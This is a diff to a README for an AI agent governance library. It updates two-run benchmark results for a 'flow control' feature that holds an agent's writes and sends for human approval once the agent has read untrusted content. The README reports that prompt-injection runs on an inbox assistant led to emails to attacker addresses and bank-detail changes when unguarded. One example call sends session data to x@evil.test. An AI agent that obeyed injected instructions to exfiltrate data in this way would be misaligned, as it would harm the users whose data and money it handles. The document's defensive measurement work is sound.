@@ -36,7 +36,7 @@ Write AI agent governance policies in YAML. The engine evaluates every agent act
 - **Extensible** — custom matchers via `@register_matcher` plugin system
 - **Framework adapters** — LangChain, OpenAI Agents SDK, or any platform via `@guard` decorator
 - **Audit log** — JSONL trail of every evaluation, feeds into any observability stack
-- **Flow control (0.2)** — tools declare what they read, write and send; once a session has read untrusted content or sensitive data, writes and sends wait for a person's approval of the exact call. Measured on an inbox assistant: 65 exfiltration emails without it, 0 with it. See [Flow control](#flow-control)
+- **Flow control (0.2)** — tools declare what they read, write and send; once a session has read untrusted content or sensitive data, writes and sends wait for a person's approval of the exact call. Measured on an inbox assistant: 64–65 exfiltration emails without it, 0 with it. See [Flow control](#flow-control)
 - **Grounded numbers** — flag figures in generated text that no source contains
 - **TrustGate integration** — measure whether your guardrails catch what they claim
 
@@ -162,10 +162,10 @@ guard.call(session, "send_email", send_email, {"to": "x@evil.test", "body": data
 
 A person approves or rejects the frozen call once; code executes exactly what was approved.
 
-| 42 injection runs, gpt-4.1-mini | Unguarded | Flow control |
+| 42 injection runs, gpt-4.1-mini (two runs) | Unguarded | Flow control |
 |---|---|---|
-| Emails executed to attacker addresses | 65 | 0 |
-| Bank-detail change tickets executed | 30 | 0 |
+| Emails executed to attacker addresses | 65, 64 | 0, 0 |
+| Bank-detail change tickets executed | 30, 29 | 0, 0 |
 | Legitimate sends after reading mail that waited for approval | 0 | all |
 
 The last row is the cost. Method, scenarios and caveats:
